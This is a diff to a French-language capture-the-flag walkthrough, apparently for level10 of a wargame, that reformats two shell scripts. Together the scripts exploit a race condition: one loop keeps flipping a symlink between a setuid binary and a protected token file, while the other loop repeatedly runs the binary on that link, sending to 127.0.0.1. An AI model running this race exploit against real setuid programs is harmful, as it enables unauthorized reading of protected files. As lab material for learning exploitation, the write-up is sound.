@@ -39,19 +39,19 @@ Donc dans /tmp/ :
 
 Ici on creer une boucle infini qui va creer des sim-link de level10/token pour utiliser la " faille "
 >nano script.sh
-    >while true;
-    >do
-    >        ln -fs /home/user/level10/level10 /tmp/link;
-    >        ln -fs /home/user/level10/token /tmp/link;
-    >done
+    while true;
+    do
+            ln -fs /home/user/level10/level10 /tmp/link;
+            ln -fs /home/user/level10/token /tmp/link;
+    done
 
 
 Ensuite il faut que l'on fasse une autre boucle infini pour utiliser level10 sur le /tmp/link
 >nano script2.sh
-    >while true;
-    >do 
-    >        ./../home/user/level10/level10 /tmp/link 127.0.0.1
-    >done
+    while true;
+    do 
+            ./../home/user/level10/level10 /tmp/link 127.0.0.1
+    done
 
 >chmod 777 script.sh script2.sh
 
